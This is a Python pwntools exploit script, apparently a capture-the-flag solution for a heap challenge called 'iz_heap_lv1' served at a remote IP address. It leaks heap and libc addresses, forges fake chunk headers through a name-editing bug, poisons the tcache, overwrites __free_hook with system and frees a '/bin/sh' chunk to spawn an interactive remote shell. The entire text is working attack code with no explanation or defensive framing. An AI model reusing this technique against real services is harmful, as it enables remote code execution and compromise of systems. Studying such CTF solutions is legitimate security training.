from pwn import *

#p=process("./iz_heap_lv1")
p=remote("165.22.110.249",3333)

sa = lambda x,y : p.sendafter(x,y)
cho = lambda x : sa("Choice",str(x))
go = lambda : p.interactive()

def add(size,data):
    cho(1)
    sa("size",str(size))
    sa("data",data)

def edit(idx,size,data):
    cho(2)
    sa("index",str(idx))
    sa("size",str(size))
    sa("data",data)

def delete(idx):
    cho(3)
    sa("index",str(idx))

def edit_name(c,name):
    cho(4)
    sa("edit",c)
    if c=='Y':
        sa("name",name)
    else:
        p.recvuntil("Name: ")
        return p.recvline()[:-1]

sa("name","\x00")

for i in range(3):
    add(0x50,str(i)*0x50)
add(0x40,"/bin/sh\x00")
add(0x40,"/bin/sh\x00")
for i in range(16):
    print i
    add(0x40,str(i)*0x40)

hb = u64(edit_name('N',1).ljust(8,'\x00'))-0x790-0x140
print hex(hb)

for i in range(7):
    edit_name('Y',p64(0x602120)+p64(0)+p64(0)+p64(0xc1))
    delete(20)

edit_name("Y",p64(0x602120)+p64(0)+p64(0)+p64(0xc1)+"A"*0xb0+p64(0)+p64(0x21)+p64(0)*3+p64(0x21))
delete(20)
edit_name("Y","A"*0x20)
p.recvuntil("A"*0x20)
lb = u64(p.recvline()[:-1]+'\x00'*2) - 0x3ebca0
fh = lb + 0x3ed8e8
system = lb + 0x4f440

edit_name('Y',p64(hb+0x250+0x10))
delete(0)
delete(1)
delete(20)
delete(3)
add(0x50,p64(fh))
add(0x50,"FAKE")
add(0x50,p64(fh))
add(0x50,p64(system))

delete(4)

go()
